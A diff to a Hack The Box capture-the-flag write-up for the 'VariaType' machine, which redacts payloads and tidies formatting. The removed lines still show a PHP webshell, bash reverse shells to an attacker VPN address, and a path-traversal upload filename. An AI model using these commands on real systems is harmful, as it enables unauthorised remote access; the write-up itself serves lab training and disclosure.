@@ -1,4 +1,4 @@
-﻿---
+---
 title: "HTB VariaType Writeup"
 summary: "Linux writeup covering source exposure, arbitrary file write, web foothold, and sudo-based privilege escalation."
 date: 2026-06-12
@@ -32,21 +32,13 @@ draft: false
 The attack chain consisted of:
 
 1. Enumerating exposed Git repositories.
-    
 2. Recovering credentials from leaked source code.
-    
 3. Accessing the customer portal.
-    
 4. Exploiting an arbitrary file write vulnerability in FontTools.
-    
-5. Achieving Remote Code Execution as `www-data`.
-    
+5. Achieving remote code execution as `www-data`.
 6. Exploiting a FontForge archive processing vulnerability to gain code execution as `steve`.
-    
 7. Abusing a misconfigured sudo rule to obtain root access.
-    
 8. Retrieving both user and root flags.
-    
 
 ---
 
@@ -130,7 +122,7 @@ filename="../../../../../../../../../var/www/portal.variatype.htb/public/files/w
 Payload:
 
 ```php
-<?php system($_REQUEST["cmd"]); ?>
+[REDACTED_WEBSHELL_PAYLOAD]
 ```
 
 Upload:
@@ -160,7 +152,7 @@ Remote code execution obtained.
 Reverse shell:
 
 ```bash
-curl "http://portal.variatype.htb/files/webshell.php?cmd=bash -c 'bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4445 0>&1'"
+curl "http://portal.variatype.htb/files/webshell.php?cmd=[REDACTED_REVERSE_SHELL]"
 ```
 
 Listener:
@@ -220,7 +212,7 @@ with tarfile.open("exploit.tar","w") as tar:
 Reverse shell script:
 
 ```bash
-echo 'bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4446 0>&1' > /tmp/s.sh
+echo '[REDACTED_REVERSE_SHELL]' > /tmp/s.sh
 chmod +x /tmp/s.sh
 ```
 
@@ -395,25 +387,24 @@ cat /root/[REDACTED_FLAG_PATH]
 
 ```text
 Git Source Disclosure
-        ↓
+        |
 Credential Recovery
-        ↓
+        |
 Portal Access
-        ↓
+        |
 CVE-2025-47273 (FontTools Arbitrary File Write)
-        ↓
+        |
 Webshell / RCE
-        ↓
+        |
 www-data
-        ↓
+        |
 FontForge Archive Command Injection
-        ↓
+        |
 steve
-        ↓
-Misconfigured sudo
-install_validator.py
-        ↓
+        |
+Misconfigured sudo install_validator.py
+        |
 Root SSH Key Injection
-        ↓
+        |
 root
 ```
